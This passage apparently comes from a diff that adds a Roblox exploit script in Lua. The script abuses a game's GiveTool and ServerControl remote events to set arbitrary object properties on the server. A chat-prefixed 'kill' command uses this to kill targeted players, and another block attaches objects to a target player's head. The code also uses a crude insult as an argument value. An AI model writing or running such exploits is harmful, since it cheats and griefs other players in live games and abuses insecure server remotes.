+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+wait(0.1)
+game.Players.LocalPlayer.Character:WaitForChild("PompousTheCloud")
+game.Players.LocalPlayer.Character.PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
+    game.Players.LocalPlayer.Character.PompousTheCloud:WaitForChild("EffectCloud")
+    D:FireEvent("PompousTheCloud",G["PompousTheCloud"]["EffectCloud"]["Weld"],"Part0",game.Players[g.Name].Character.Head)
+    D:FireEvent("PompousTheCloud",G["PompousTheCloud"]["EffectCloud"],"CFrame",game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
+game.Players.LocalPlayer.Character.PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = false})
+game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+end 
+end
+
+if string.sub(msg,1,6)==prefix.."kill "then
+game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud") 
+for f,g in pairs(GetPlayer(string.sub(msg,7)))do 
+local C=game:GetService('Players').LocalPlayer.Name;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+game.Workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
+game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+end 
+end
+end)
